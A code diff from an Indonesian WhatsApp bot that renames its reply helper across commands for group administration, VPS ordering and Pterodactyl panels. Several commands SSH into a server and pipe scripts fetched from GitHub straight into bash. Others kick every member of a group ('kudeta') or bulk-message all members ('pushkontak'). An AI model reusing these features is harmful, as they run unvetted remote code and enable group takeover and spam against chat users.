-        return Reply(
+        return replyV1(
             '🔒 GROUP LOCKED\n\n' +
             'Pengaturan info grup sekarang hanya dapat diubah oleh admin.'
         )
     } catch (err) {
         console.error('[LOCKGC ERROR]', err)
-        return Reply(
+        return replyV1(
             '❌ Gagal mengunci pengaturan grup.\n\n' +
             `Error: ${err?.message || err}`
         )
@@ -32939,20 +32912,20 @@ case 'lockgc': {
 break
 case 'unlockgc': {
     if (!m.isGroup)
-        return Reply(mess.group)
+        return replyV1(mess.group)
     if (!isAdmins && !isCreator)
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
     if (!isBotAdmins)
-        return Reply(mess.botAdmin)
+        return replyV1(mess.botAdmin)
     try {
         await conn.groupSettingUpdate(m.chat, 'unlocked')
-        return Reply(
+        return replyV1(
             '🔓 GROUP UNLOCKED\n\n' +
             'Anggota grup kembali dapat mengubah info grup.'
         )
     } catch (err) {
         console.error('[UNLOCKGC ERROR]', err)
-        return Reply(
+        return replyV1(
             '❌ Gagal membuka pengaturan grup.\n\n' +
             `Error: ${err?.message || err}`
         )
@@ -32960,34 +32933,34 @@ case 'unlockgc': {
 }
 break
 case "kudeta": case "kickallmem": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
-if (memberFilter.length < 1) return Reply("Grup Ini Sudah Tidak Ada Member!")
-await Reply("Kudeta Grup By XnalzNotDev 🔥")
+if (memberFilter.length < 1) return replyV1("Grup Ini Sudah Tidak Ada Member!")
+await replyV1("Kudeta Grup By XnalzNotDev 🔥")
 for (let i of memberFilter) {
 await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
 await sleep(1000)
 }
-await Reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
+await replyV1("Kudeta Grup Telah Berhasil 🏴‍☠️")
 }
 break
 case "getcase": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return Reply(example("menu"))
+if (!isCreator) return replyV1(mess.owner)
+if (!text) return replyV1(example("menu"))
 const getcase = (cases) => {
 return "case "+`\"${cases}\"`+fs.readFileSync(projectPath('xeryuu.js'), 'utf8').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
 }
 try {
-Reply(`${getcase(q)}`)
+replyV1(`${getcase(q)}`)
 } catch (e) {
-return Reply(`Case ${text} tidak ditemukan`)
+return replyV1(`Case ${text} tidak ditemukan`)
 }
 }
 break
 case "demote":
 case "promote": {
   if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
     }
 if (m.quoted || text) {
 var action
@@ -32998,41 +32971,41 @@ await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(
 await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
 })
 } else {
-return Reply(example("@tag/6285###"))
+return replyV1(example("@tag/6285###"))
 }
 }
 break
 
 case "mute": {
-if (!m.isGroup) return Reply(mess.group)
-if (!isCreator && !isAdmins) return Reply(mess.admin)
+if (!m.isGroup) return replyV1(mess.group)
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
 if (!global.db) global.db = {}
 if (!global.db.groups || typeof global.db.groups !== 'object' || Array.isArray(global.db.groups)) global.db.groups = {}
 const groupSettings = global.db.groups[m.chat] ||= { mute: false, inactive: {} }
 if (typeof groupSettings.mute !== 'boolean') groupSettings.mute = false
 const teks = String(text || '').trim().toLowerCase()
 if (teks === "on") {
-    if (groupSettings.mute === true) return Reply('🔇 Mute di grup ini sudah aktif!')
+    if (groupSettings.mute === true) return replyV1('🔇 Mute di grup ini sudah aktif!')
     groupSettings.mute = true
     saveDB(global.db)
-    return Reply('✅ Mute di grup ini diaktifkan. Bot akan mengabaikan pesan anggota biasa; admin dan owner tetap dapat menggunakan bot.')
+    return replyV1('✅ Mute di grup ini diaktifkan. Bot akan mengabaikan pesan anggota biasa; admin dan owner tetap dapat menggunakan bot.')
 } else if (teks === "off") {
-    if (groupSettings.mute !== true) return Reply('🔊 Mute di grup ini sudah nonaktif!')
+    if (groupSettings.mute !== true) return replyV1('🔊 Mute di grup ini sudah nonaktif!')
     groupSettings.mute = false
     saveDB(global.db)
-    return Reply('✅ Mute di grup ini dinonaktifkan. Bot kembali merespons anggota.')
+    return replyV1('✅ Mute di grup ini dinonaktifkan. Bot kembali merespons anggota.')
 } else {
-    return Reply(`Penggunaan: ${prefix}mute on/off`)
+    return replyV1(`Penggunaan: ${prefix}mute on/off`)
 }
 }
 break 
 case "mute2": {
-    if (!isCreator && !isAdmins) return Reply(mess.owner)
+    if (!isCreator && !isAdmins) return replyV1(mess.owner)
     const args = text.trim().split(/\s+/)
     const action = args[0]?.toLowerCase()
     const groupId = args[1]
     if (!groupId || !groupId.endsWith("@g.us")) {
-        return Reply(
+        return replyV1(
             `Masukkan ID Group!\n\n` +
             `Contoh:\n` +
             `.mute on 120363xxxx@g.us\n` +
@@ -33048,21 +33021,21 @@ case "mute2": {
     const group = global.db.groups[groupId]
     if (action === "on") {
         if (group.mute) {
-            return Reply(`Mute di grup tersebut sudah aktif!`)
+            return replyV1(`Mute di grup tersebut sudah aktif!`)
         }
         group.mute = true
         saveDB(global.db)
-        return Reply(`Berhasil menyalakan mute di grup tersebut!`)
+        return replyV1(`Berhasil menyalakan mute di grup tersebut!`)
     }
     if (action === "off") {
         if (!group.mute) {
-            return Reply(`Mute di grup tersebut tidak aktif!`)
+            return replyV1(`Mute di grup tersebut tidak aktif!`)
         }
         group.mute = false
         saveDB(global.db)
-        return Reply(`Berhasil mematikan mute di grup tersebut!`)
+        return replyV1(`Berhasil mematikan mute di grup tersebut!`)
     }
-    return Reply(
+    return replyV1(
         `Penggunaan:\n\n` +
         `.mute on <id_group>\n` +
         `.mute off <id_group>\n\n` +
@@ -33072,34 +33045,34 @@ case "mute2": {
 }
 break
 case "welcome": {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
     if (!global.db.groups) global.db.groups = {}
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     const mode = String(text || '').trim().toLowerCase()
-    if (!['on', 'off'].includes(mode)) return Reply(`Penggunaan: ${prefix}welcome on/off`)
+    if (!['on', 'off'].includes(mode)) return replyV1(`Penggunaan: ${prefix}welcome on/off`)
     if (mode === 'on') {
-        if (global.db.groups[m.chat].welcome === true) return Reply('Welcome di grup ini sudah aktif!')
+        if (global.db.groups[m.chat].welcome === true) return replyV1('Welcome di grup ini sudah aktif!')
         global.db.groups[m.chat].welcome = true
-        return Reply('✅ Berhasil menyalakan welcome di grup ini.')
+        return replyV1('✅ Berhasil menyalakan welcome di grup ini.')
     }
-    if (global.db.groups[m.chat].welcome === false) return Reply('Welcome di grup ini sudah nonaktif!')
+    if (global.db.groups[m.chat].welcome === false) return replyV1('Welcome di grup ini sudah nonaktif!')
     global.db.groups[m.chat].welcome = false
-    return Reply('✅ Berhasil mematikan welcome di grup ini.')
+    return replyV1('✅ Berhasil mematikan welcome di grup ini.')
 }
 break
 
 case 'antilinkch': {
-if (!m.isGroup) return Reply(mess.group)
+if (!m.isGroup) return replyV1(mess.group)
 if (mess.owner) {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 }
 if (mess.admin) {
-if (!isAdmins) return Reply(mess.admin) 
+if (!isAdmins) return replyV1(mess.admin) 
 }
 if (mess.botAdmin) {
-if (!isBotAdmins) return Reply(mess.botAdmin) 
+if (!isBotAdmins) return replyV1(mess.botAdmin) 
 }
  if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }
 
@@ -33107,13 +33080,13 @@ if (!isBotAdmins) return Reply(mess.botAdmin)
  if (argsLower === 'on') {
  antichannel[m.chat].antichannel = true;
  saveAntichannel();
- Reply('✅ Anti Link Channel WhatsApp AKTIF!');
+ replyV1('✅ Anti Link Channel WhatsApp AKTIF!');
  } else if (argsLower === 'off') {
  antichannel[m.chat].antichannel = false;
  saveAntichannel();
- Reply('❌ Anti Link Channel WhatsApp NONAKTIF!');
+ replyV1('❌ Anti Link Channel WhatsApp NONAKTIF!');
  } else {
- Reply(`Contoh:\n${prefix}antichannel on\n${prefix}antichannel off`);
+ replyV1(`Contoh:\n${prefix}antichannel on\n${prefix}antichannel off`);
  }
 }
 break
@@ -33367,7 +33340,7 @@ break
 
 case "startwings": case "configurewings": {
 let t = text.split('|')
-if (t.length < 3) return Reply(example("ipvps|pwvps|token_node"))
+if (t.length < 3) return replyV1(example("ipvps|pwvps|token_node"))
 
 let ipvps = t[0]
 let passwd = t[1]
@@ -33387,29 +33360,29 @@ ress.on('ready', () => {
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil menjalankan wings ✅\n Status wings : aktif")
+await replyV1("Berhasil menjalankan wings ✅\n Status wings : aktif")
 ress.end()
 }).on('data', async (data) => {
 await console.log(data.toString())
 }).stderr.on('data', (data) => {
 stream.write("y\n")
 stream.write("systemctl start wings\n")
-Reply('STDERR: ' + data);
+replyV1('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "cvps": {
-if (!text) return Reply(example("hostname"))
+if (!text) return replyV1(example("hostname"))
 const vpsSettings = global.vpsConfig || {}
 const vpsToken = String(vpsSettings.apiToken || global.apiDigitalOcean || "").trim()
-if (vpsSettings.enabled === false) return Reply("Sistem auto-order VPS sedang dinonaktifkan. Aktifkan global.vpsConfig.enabled di settings.js.")
-if (!vpsToken || vpsToken === "-") return Reply("Konfigurasi auto-order VPS belum lengkap. Buka settings.js lalu isi global.vpsConfig.apiToken dengan Personal Access Token DigitalOcean. Jangan gunakan apikey/capikey Panel.")
+if (vpsSettings.enabled === false) return replyV1("Sistem auto-order VPS sedang dinonaktifkan. Aktifkan global.vpsConfig.enabled di settings.js.")
+if (!vpsToken || vpsToken === "-") return replyV1("Konfigurasi auto-order VPS belum lengkap. Buka settings.js lalu isi global.vpsConfig.apiToken dengan Personal Access Token DigitalOcean. Jangan gunakan apikey/capikey Panel.")
 return conn.sendMessage(m.chat, {
   buttons: [
     {
@@ -33469,12 +33442,12 @@ return conn.sendMessage(m.chat, {
 break
 
 case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 if (!text) return
 const vpsSettings = global.vpsConfig || {}
 const vpsToken = String(vpsSettings.apiToken || global.apiDigitalOcean || "").trim()
-if (vpsSettings.enabled === false) return Reply("Sistem auto-order VPS sedang dinonaktifkan di settings.js.")
-if (!vpsToken || vpsToken === "-") return Reply("Token VPS belum diisi. Atur global.vpsConfig.apiToken di settings.js; ini berbeda dari konfigurasi Panel.")
+if (vpsSettings.enabled === false) return replyV1("Sistem auto-order VPS sedang dinonaktifkan di settings.js.")
+if (!vpsToken || vpsToken === "-") return replyV1("Token VPS belum diisi. Atur global.vpsConfig.apiToken di settings.js; ini berbeda dari konfigurasi Panel.")
     await sleep(1000)
     const sizeSlug = String(vpsSettings.sizeOptions?.[command] || ({
         r1c1: "s-1vcpu-1gb",
@@ -33489,9 +33462,9 @@ if (!vpsToken || vpsToken === "-") return Reply("Token VPS belum diisi. Atur glo
     const apiBaseUrl = String(vpsSettings.apiBaseUrl || "https://api.digitalocean.com/v2").trim().replace(/\/$/, "")
     const pollIntervalMs = Math.max(2000, Number(vpsSettings.pollIntervalMs || 5000))
     const readyTimeoutMs = Math.max(pollIntervalMs, Number(vpsSettings.readyTimeoutMs || 180000))
-    if (!sizeSlug) return Reply(`Ukuran VPS untuk ${command} belum disetel di global.vpsConfig.sizeOptions.`)
+    if (!sizeSlug) return replyV1(`Ukuran VPS untuk ${command} belum disetel di global.vpsConfig.sizeOptions.`)
     let hostname = text.toLowerCase().trim()
-    if (!/^[a-z0-9][a-z0-9.-]{0,62}$/.test(hostname)) return Reply("Hostname tidak valid. Gunakan huruf kecil, angka, titik, atau tanda minus; mulai dengan huruf/angka.")
+    if (!/^[a-z0-9][a-z0-9.-]{0,62}$/.test(hostname)) return replyV1("Hostname tidak valid. Gunakan huruf kecil, angka, titik, atau tanda minus; mulai dengan huruf/angka.")
     try {
         const dropletData = {
             name: hostname,
@@ -33519,7 +33492,7 @@ if (!vpsToken || vpsToken === "-") return Reply("Token VPS belum diisi. Atur glo
             throw new Error(`DigitalOcean menolak pembuatan VPS: ${detail}`)
         }
         const dropletId = responseData.droplet.id
-        await Reply(`Permintaan VPS diterima. Menunggu VPS aktif...\nID: ${dropletId}\nRegion: ${region}\nImage: ${imageSlug}`)
+        await replyV1(`Permintaan VPS diterima. Menunggu VPS aktif...\nID: ${dropletId}\nRegion: ${region}\nImage: ${imageSlug}`)
         const startedAt = Date.now()
         let ipVPS = "Belum tersedia; periksa kembali status VPS di DigitalOcean"
         let dropletStatus = "creating"
@@ -33549,17 +33522,17 @@ if (!vpsToken || vpsToken === "-") return Reply("Token VPS belum diisi. Atur glo
         await conn.sendMessage(m.chat, { text: messageText })
     } catch (err) {
         console.error('[VPS AUTO-ORDER]', err?.stack || err)
-        return Reply(`Terjadi kesalahan pada auto-order VPS: ${err?.message || err}`)
+        return replyV1(`Terjadi kesalahan pada auto-order VPS: ${err?.message || err}`)
     }
 }
 break
 
 //isntalltema
 case 'buyonlu': {
-        if (!isCreator) return Reply(mess.owner)
-if (!text || !text.split("|")) return Reply("ipvps|pwvps")
+        if (!isCreator) return replyV1(mess.owner)
+if (!text || !text.split("|")) return replyV1("ipvps|pwvps")
 let vii = text.split("|")
-if (vii.length < 2) return Reply("ipvps|pwvps")
+if (vii.length < 2) return replyV1("ipvps|pwvps")
 global.installtema = {
 vps: vii[0], 
 pwvps: vii[1]
@@ -33663,8 +33636,8 @@ const MenuX = {
 break 
 
 case "uninstallthema": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33680,13 +33653,13 @@ const connSettings = {
 const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
 const ress = new Client();
 
-await Reply("Memproses uninstall tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+await replyV1("Memproses uninstall tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 
 ress.on('ready', () => {
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil uninstall tema pterodactyl ✅")
+await replyV1("Berhasil uninstall tema pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33700,15 +33673,15 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "installtemaenigma": 
 case "instaltemaenigma": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33725,11 +33698,11 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', () => {
-Reply("Memproses install tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+replyV1("Memproses install tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil install tema enigma pterodactyl ✅")
+await replyV1("Berhasil install tema enigma pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33747,14 +33720,14 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "installtemabilling": case "instaltemabiling": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33771,11 +33744,11 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', () => {
-Reply("Memproses install tema billing pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+replyV1("Memproses install tema billing pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil install tema billing pterodactyl ✅")
+await replyV1("Berhasil install tema billing pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33790,14 +33763,14 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "installtemastellar": case "installtemastelar": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33814,11 +33787,11 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', async () => {
-Reply("Memproses install tema stellar pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+replyV1("Memproses install tema stellar pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil install tema stellar pterodactyl ✅")
+await replyV1("Berhasil install tema stellar pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33833,14 +33806,14 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "installtemanightcore": case "installtemanightcore": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33857,11 +33830,11 @@ const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodac
 const ress = new Client();
 
 ress.on('ready', async () => {
-Reply("Memproses install tema night core pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+replyV1("Memproses install tema night core pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil install tema nightcore pterodactyl ✅")
+await replyV1("Berhasil install tema nightcore pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33873,14 +33846,14 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
 
 case "installdepend": {
-    if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+    if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33897,11 +33870,11 @@ const connSettings = {
     const ress = new Client();
 
     ress.on('ready', async () => {
-        Reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
+        replyV1("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
         ress.exec(command, (err, stream) => {
             if (err) throw err;
             stream.on('close', async (code, signal) => {
-                await Reply("Berhasil install Depend silakan ketik .installnebula ✅");
+                await replyV1("Berhasil install Depend silakan ketik .installnebula ✅");
                 ress.end();
             }).on('data', async (data) => {
                 console.log(data.toString());
@@ -33915,14 +33888,14 @@ const connSettings = {
         });
     }).on('error', (err) => {
         console.log('Connection Error: ' + err);
-        Reply('Katasandi atau IP tidak valid');
+        replyV1('Katasandi atau IP tidak valid');
     }).connect(connSettings);
 }
 break
 
 case "installtemanebula": {
-if (!isCreator) return Reply(mess.owner)
-if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")
+if (!isCreator) return replyV1(mess.owner)
+if (global.installtema == undefined) return replyV1("Ip / Password Vps Tidak Ditemukan")
 
 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
@@ -33939,11 +33912,11 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/i
 const ress = new Client();
 
 ress.on('ready', async () => {
-Reply("Memproses install thema Nebula pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+replyV1("Memproses install thema Nebula pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
-await Reply("Berhasil install tema nebula pterodactyl ✅")
+await replyV1("Berhasil install tema nebula pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
@@ -33956,7 +33929,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-Reply('Katasandi atau IP tidak valid');
+replyV1('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -33964,24 +33937,24 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "joingb": case "join": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return Reply(example("linkgcnya"))
-if (!text.includes("chat.whatsapp.com")) return Reply("Link tautan tidak valid")
+if (!isCreator) return replyV1(mess.owner)
+if (!text) return replyV1(example("linkgcnya"))
+if (!text.includes("chat.whatsapp.com")) return replyV1("Link tautan tidak valid")
 let result = text.split('https://chat.whatsapp.com/')[1]
 let id = await conn.groupAcceptInvite(result)
-Reply(`Berhasil bergabung ke dalam grup ${id}`)
+replyV1(`Berhasil bergabung ke dalam grup ${id}`)
 }
 break
 
 case "pushkontak2": {
-if (!isOwner) return Reply(mess.owner)
-if (!m.isGroup) return Reply(mess.group)
-if (!text) return Reply(example("pesannya"))
+if (!isOwner) return replyV1(mess.owner)
+if (!m.isGroup) return replyV1(mess.group)
+if (!text) return replyV1(example("pesannya"))
 const teks = text
 const jidawal = m.chat
 const data = await conn.groupMetadata(m.chat)
 const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
-await Reply(`Memproses pushkontak ke ${halls.length} member grup`)
+await replyV1(`Memproses pushkontak ke ${halls.length} member grup`)
 for (let mem of halls) {
 if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
 await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
@@ -34001,7 +33974,7 @@ const teks = global.textpushkontak
 const jidawal = m.chat
 const data = await conn.groupMetadata(idgc)
 const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
-await Reply(`Memproses pushkontak ke dalam grup ${data.subject}`)
+await replyV1(`Memproses pushkontak ke dalam grup ${data.subject}`)
 
 for (let mem of halls) {
 if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
@@ -34015,8 +33988,8 @@ await conn.sendMessage(jidawal, {text: `Berhasil Pushkontak ✅\nTotal member be
 break
 
 case "pushkontak": {
-if (!isOwner) return Reply(mess.owner)
-if (!text) return Reply(example("pesannya"))
+if (!isOwner) return replyV1(mess.owner)
+if (!text) return replyV1(example("pesannya"))
 const meta = await conn.groupFetchAllParticipating()
 let dom = await Object.keys(meta)
 global.textpushkontak = text
@@ -34324,8 +34297,8 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
-if (!isCreator && !isAdmins) return Reply(mess.owner)
-if (!args[0]) return Reply('Contoh: .5gb1 username')
+if (!isCreator && !isAdmins) return replyV1(mess.owner)
+if (!args[0]) return replyV1('Contoh: .5gb1 username')
 let username = args[0].toLowerCase()
 var ram
 var disknya
@@ -34381,7 +34354,7 @@ let f = await fetch(domain + "/api/application/users", {
 })
 })
 let data = await f.json();
-if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
+if (data.errors) return replyV1(JSON.stringify(data.errors[0], null, 2))
 let user = data.attributes
 let desc = tanggal(Date.now())
 let usr_id = user.id
@@ -34435,12 +34408,12 @@ port_range: [],
 })
 })
 let result = await f2.json()
-if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
+if (result.errors) return replyV1(JSON.stringify(result.errors[0], null, 2))
 let server = result.attributes
 var orang
 if (m.isGroup) {
 orang = m.sender
-await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
+await replyV1("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
 } else {
 orang = m.chat
 }
@@ -34476,25 +34449,25 @@ break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case "self": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 conn.public = false
 if (conn.__xeryuuRole !== 'JADIBOT') {
     global.db.settings.whatsappMode = 'self'
     saveDB(global.db)
 }
-return Reply("✅ Mode bot diubah menjadi *SELF*. Hanya owner yang dapat menggunakan bot.")
+return replyV1("✅ Mode bot diubah menjadi *SELF*. Hanya owner yang dapat menggunakan bot.")
 }
 break      
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case 'swdl': {
-    if (!m.quoted) return Reply('❌ Reply status WhatsApp yang mau di-download')
+    if (!m.quoted) return replyV1('❌ Reply status WhatsApp yang mau di-download')
 
     let q = m.quoted
     let mime = (q.msg || q).mimetype || (q.msg || q).mime || ''
 
     if (!/image|video/.test(mime)) {
-        return Reply('❌ Status harus berupa foto atau video')
+        return replyV1('❌ Status harus berupa foto atau video')
     }
 
     let media = await q.download()
@@ -34514,11 +34487,11 @@ case 'swdl': {
 break
 //TOOLSMENU
 case "number-info": {
-  if (!q) return Reply("Masukkan nomor!\nContoh: .number-info 628123456789");
+  if (!q) return replyV1("Masukkan nomor!\nContoh: .number-info 628123456789");
 
   let nomor = q.replace(/[^0-9]/g, "");
   if (nomor.startsWith("0")) nomor = "62" + nomor.slice(1);
-  if (!/^\d+$/.test(nomor)) return Reply("Nomor tidak valid!");
+  if (!/^\d+$/.test(nomor)) return replyV1("Nomor tidak valid!");
 
   const jid = nomor + "@s.whatsapp.net";
 
@@ -34828,7 +34801,7 @@ case "number-info": {
   }
 
   // ===== OUTPUT =====
-  Reply(
+  replyV1(
     `📞 *INFORMASI NOMOR*\n\n` +
     `🔢 Nomor: ${nomor}\n` +
     `🌍 Negara: ${negara}\n` +
@@ -34845,12 +34818,12 @@ case "number-info": {
 
 break;
 case "school-track": {
-  if (!q) return Reply(`🏫 *School Tracker*\n\nFormat: .schooltrack nama sekolah | kota\nContoh: .schooltrack sman 1 | jakarta`);
+  if (!q) return replyV1(`🏫 *School Tracker*\n\nFormat: .schooltrack nama sekolah | kota\nContoh: .schooltrack sman 1 | jakarta`);
 
   const [namaSekolah, daerah] = text.split('|').map(str => str.trim());
-  if (!namaSekolah || !daerah) return Reply('❌ Format salah!');
+  if (!namaSekolah || !daerah) return replyV1('❌ Format salah!');
 
-  const statusMsg = await Reply(`🔍 Mencari: ${namaSekolah} di ${daerah}...`);
+  const statusMsg = await replyV1(`🔍 Mencari: ${namaSekolah} di ${daerah}...`);
 
   const apis = [
     `https://api-sekolah-indonesia.vercel.app/sekolah?s=${encodeURIComponent(namaSekolah)}&kab=${encodeURIComponent(daerah)}`,
@@ -34939,7 +34912,7 @@ case "school-track": {
 
   if (Array.isArray(schoolData) && schoolData.length > 1) {
     setTimeout(async () => {
-      await Reply(`📚 Ditemukan ${schoolData.length} sekolah serupa. Gunakan filter lebih spesifik untuk hasil tepat.`);
+      await replyV1(`📚 Ditemukan ${schoolData.length} sekolah serupa. Gunakan filter lebih spesifik untuk hasil tepat.`);
     }, 1000);
   }
 }
@@ -34959,17 +34932,17 @@ break;
 
 case 'nik-information': {
     if (!isAdmins)
